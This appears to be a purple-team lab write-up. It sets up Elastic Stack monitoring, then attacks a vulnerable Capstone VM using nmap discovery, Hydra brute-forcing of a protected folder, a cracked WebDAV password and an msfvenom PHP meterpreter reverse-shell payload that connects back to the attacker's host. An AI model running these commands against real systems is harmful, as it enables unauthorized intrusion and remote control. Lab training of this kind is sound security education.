# Purple Teaming


Monitoring Setup Instructions

As I attack the webserver I need to make sure that my Elastic Stack is logging all activity.

I start by launching the Elastic Stack and Kibana on my monitoring server:

![filebeat_setup.png]

#### Setup Filebeat:

##### Run the following commands:

```bash
filebeat modules enable apache
```
``bash
filebeat setup
```

#### Setup Metricbeat:

##### Run the following commands:


```bash
metricbeat modules enable apache
```
```bash
metricbeat setup
```

![metrcibeat_setup.png]


#### Setup Packetbeat:


##### Run the following command:

```bash
packetbeat setup
```

Restart all 3 services. Run the following commands:

```bash
systemctl restart filebeat
```
```bash
systemctl restart metricbeat
```
```bash
systemctl restart packetbeat
```


## Time To Attack!

Today, I will act as an offensive security Red Teamer to exploit a vulnerable Capstone VM.

##### I will need to use the following tools, in no particular order:

>Firefox
>Hydra
>Nmap
>John the Ripper
>Metasploit
>curl
>MSVenom


Now it's time to search for the webserver that I am looking to attack.

##### Below, the `nmap` command I used to discover the IP address of the Linux web server and have all IPs discovered saved into the file `nmap_scanned_ips`:

```bash
nmap -sn 192.168.0.0/24 | awk '/Nmap scan/{gsub(/[()]/,"",$NF); print $NF > "nmap_scanned_ips"}'
```

From the list of IPs that Nmap has discovered on my virtual private network:

![nmap_scanned_ips]

I then run a service scan on all IPs except the IP of my Kali VM machine (192.168.1.90):


![nmap_webserver_nmap_lookup]


I found the Linux Apache webserver I was looking for with IP address `192.168.1.105` on port `80`.

Next, I open a web browser to access the webserver:

![webserver_webdirectory]


Next, I am tasked with finding a secret folder and break into it.


After reading the company's blog I found a lead on the location of the secret folder:

![secret_folder_clue]

Next, in the "meet our team" section I found an interesting clue about who is in charge of the folder. His name is Ashton:

![secret_folder_admin_ashton]

Next, I used `Hydra` to brute force the access to the secret folder located at /company_folders/secret_folder.

I used the following command to brute force the access to the web page using `ashton` as the username and the `rockyou.txt` wordlist to brute force his password:

```bash
hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder
```

![hydra_brute_forced_password]

Next, I use Ashton's credentials to acces the secret_folder. I found a note that he left to himself, detailing how to connect to the company's webdav server:

![ashton_instruction_webdav]


I noticed a hash for ryan's account is displayed on the page. I decided to use the Crack Station website to crack it... And it worked!

![crack_station_cracked_hash]


The cracked password is: `linux4u`


Next, from the details left by Ashton on how to connect to the Webdav server, I figured out the path using the updated IP address of their server and successfully accessed the login windows and authenticated with the cracked credentials   `Ryan:linux4u`:

 ![]
![]
![]


Following the successful connection to the Webdav server, I am tasked with dropping a PHP reverse Shell payload.

I used `msfvenom` to create my payload file named `exploit.php` with the following command:

```bash
/usr/bin/msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.90 LPORT=4444 R > exploit.php
```

![php_payload_creation]


Next, I uploaded the reverse shell payload (exploit.php file) into the Webdav server:

![copy_paste_exploitPHP_in_webdav]



